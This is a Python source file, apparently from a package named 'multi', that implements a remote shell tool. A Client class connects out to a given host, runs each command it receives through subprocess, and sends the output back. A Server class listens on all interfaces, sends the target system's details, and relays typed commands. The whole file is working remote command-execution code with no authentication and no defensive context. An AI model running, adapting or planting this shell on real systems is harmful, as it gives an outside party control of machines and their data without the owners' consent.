import getpass
import subprocess
import platform
from multi.utils import *


class Client(object):
    def __init__(self, rhost: str, port: int = RandShort()):
        self.TargetAddr = rhost
        self.Port = port
        self.Buffer = 1024

    def connect(self) -> None:
        socket.setdefaulttimeout(5)
        sock = socket.socket()

        try:
            sock.connect((self.TargetAddr, self.Port))
        except socket.timeout:
            throw(f"Connection with {self.TargetAddr}, timed out.")
        except:
            throw(f"Could not establish connection with {self.TargetAddr}")

        greeting = sock.recv(self.Buffer).decode()
        print(greeting)

        while True:
            command = sock.recv(self.Buffer).decode()

            if command.lower() in ["exit", "quit"]:
                sock.send("Connection will now terminate".encode())
                break

            output = subprocess.getoutput(command)
            sock.send(output.encode())


class Server(object):
    def __init__(self, lhost: str = "0.0.0.0", port: int = RandShort()):
        self.HostAddr = lhost
        self.Port = port
        self.Buffer = 1024

    def get_info(self) -> str:
        info = []
        out = ""

        for x, stat in enumerate(platform.uname()):
            if x != 2:
                info.append(stat)

        for item in info:
            if info.index(item) == 0:
                out = item
            else:
                out = f"{out} {item}"

        return out

    def listen(self) -> None:
        server_sock = socket.socket()
        server_sock.bind((self.HostAddr, self.Port))

        server_sock.listen(1)  # stay open for one connection
        status(f"Listening for incoming TCP connection on port {self.Port}...")

        client_sock, addr = server_sock.accept()
        status(f"Received connection from {addr[0]} on port {addr[1]}.")

        greeting = self.get_info()
        client_sock.send(greeting.encode())

        while True:
            prompt = getpass.getuser() + "@" + platform.node()

            command = input(f"{prompt}> ")
            client_sock.send(command.encode())

            if command.lower() in ["exit", "quit"]:
                client_sock.send("Connection will now terminate".encode())
                break

            cmd_results = client_sock.recv(self.Buffer).decode()
            print(cmd_results)

        client_sock.close()
        server_sock.close()
